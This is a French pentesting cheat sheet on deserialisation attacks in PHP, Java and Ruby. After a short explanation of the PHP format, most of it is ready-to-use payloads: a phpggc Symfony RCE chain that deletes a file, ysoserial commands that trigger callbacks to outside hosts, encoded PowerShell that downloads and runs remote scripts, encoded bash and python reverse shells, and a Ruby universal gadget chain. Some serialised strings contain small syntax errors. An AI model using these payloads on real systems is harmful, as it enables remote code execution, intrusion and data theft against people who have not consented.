## PHP Deserialisation

Exemple : `O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}`

- `O:4:"User"` : Un objet avec un nom de classe de 4 caractères "User"
- `2` : L'objet a deux propriétés
- `s:4:"name"` : Le nom du premier attribut est composé de 4 caractères "name"
- `s:6:"carlos"` : La valeur de l'attribut est composé de 6 caractères "carlos"
- `s:10:"isLoggedIn"` : Le nom du second attribut est composé de 10 caractères "isLoggedIn"
- `b:1` : La valeur de l'attribut est un booléen à true

### Fonctions de sérailisation et désérialisation

- `serialize()` : Retourne une chaîne de caractères contenant une représentation sérialisée de la valeur passée en paramètre.
- `unserialize()` : Retourne la valeur initiale d'une variable qui a été sérialisée.

### Fonctions magiques

Les fonctions magiques sont des fonctions qui sont appelées automatiquement à l'instanciation d'un objet.

Par exemple :

```php
class User {
    public $name;
    public $isLoggedIn;

    public function __construct($name) {
        $this->name = $name;
        $this->isLoggedIn = false;
    }
}
```

La fonction `__construct()` est appelée automatiquement lors de l'instanciation de l'objet.

### Outils pour la sérialisation

- (phpggc)[https://github.com/ambionics/phpggc]

```bash
$ ./phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                                              TYPE                   VECTOR         I    
Bitrix/RCE1                               17.x.x <= 22.0.300                                   RCE (Function call)    __destruct          
CakePHP/RCE1                              ? <= 3.9.6                                           RCE (Command)          __destruct          
CakePHP/RCE2                              ? <= 4.2.3                                           RCE (Function call)    __destruct          
CodeIgniter4/FR1                          4.0.0 <= 4.3.6                                       File read              __toString     *    
CodeIgniter4/RCE1                         4.0.2 <= 4.0.3                                       RCE (Function call)    __destruct          
CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.3.6                                  RCE (Function call)    __destruct          
CodeIgniter4/RCE3                         4.0.4 <= 4.3.6                                       RCE (Function call)    __destruct          
CodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                           RCE (Function call)    __destruct          
CodeIgniter4/RCE5                         -4.1.3+                                              RCE (Function call)    __destruct          
CodeIgniter4/RCE6                         -4.1.3 <= 4.2.10+                                    RCE (Function call)    __destruct          
Doctrine/FW1                              ?                                                    File write             __toString     *    
Doctrine/FW2                              2.3.0 <= 2.4.0 v2.5.0 <= 2.8.5                       File write             __destruct     *    
Doctrine/RCE1                             1.5.1 <= 2.7.2                                       RCE (PHP code)         __destruct     *    
Doctrine/RCE2                             1.11.0 <= 2.3.2                                      RCE (Function call)    __destruct     *    
Dompdf/FD1                                1.1.1 <= ?                                           File delete            __destruct     *    
...
```

```bash
$./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt'

O:47:"Symfony\Component\Cache\Adapter\TagAwareAdapter":2:{s:57:"Symfony\Component\Cache\Adapter\TagAwareAdapterdeferred";a:1:{i:0;:33:"Symfony\Component\Cache\CacheItem":2:{s:11:"*poolHash";i:1;s:12:"*innerItem";s:26:"rm /home/carlos/morale.txt";}}s:53:"Symfony\Component\Cache\Adapter\TagAwareAdapterpool";O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"Symfony\Component\Cache\Adapter\ProxyAdapterpoolHash";i:1;s:58:"Symfony\Component\Cache\Adapter\ProxyAdaptersetInnerItem";s:4:"exec";}}
```

## Java Deserialisation

La sérialisation en Java n'est pas aussi facilement lisible que la sérialisation en PHP.

Cependant, il y a quelques indices qui nous indiquent que nous avons affaire à une sérialisation Java.

- `rO0` : C'est un en-tête de sérialisation Java encodé en base64.
- `ac ed` : C'est un en-tête de sérialisation Java encodé en hexadécimal.

### Fonctions de sérailisation et désérialisation

- `ObjectInputStream.readObject()` : Lit un objet à partir du flux d'entrée.
- `ObjectOutputStream.writeObject()` : Écrit un objet dans le flux de sortie.

### Outils pour la sérialisation

- [ysoserial](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial.jar)

**yoserial nécessite la version 8 de Java.**

```bash
# PoC to make the application perform a DNS req
java -jar ysoserial.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload 
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```

## Ruby désérialisation

Il existe un gadget chain universel pour Ruby :

```ruby
Gem::SpecFetcher
Gem::Installer
require "base64"
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end
wa1 = Net::WriteAdapter.new(Kernel, :system)
rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "PAYLOAD_HERE")
wa2 = Net::WriteAdapter.new(rs, :resolve)
i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")
n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)
t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)
r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)
payload = Marshal.dump({payload: [Gem::SpecFetcher, Gem::Installer, r]})
puts Base64.strict_encode64(payload)
```